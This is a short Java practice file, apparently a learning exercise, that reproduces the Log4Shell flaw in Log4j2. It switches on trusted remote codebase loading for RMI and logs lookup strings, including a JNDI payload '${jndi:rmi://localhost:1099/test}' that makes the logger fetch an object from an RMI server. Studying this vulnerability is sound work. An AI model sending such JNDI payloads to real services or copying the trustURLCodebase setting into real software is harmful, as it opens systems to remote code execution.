package me.luliru.practice.log4j2.hole;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Client
 * Created by luliru on 1/4/22.
 */
public class Client {

    private static  final Logger LOGGER= LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String username="${java:os}";
        LOGGER.info("Hello, {}",username);
        LOGGER.info("CPU: ${java:hw}");
        LOGGER.error("${jndi:rmi://localhost:1099/test}");
    }
}
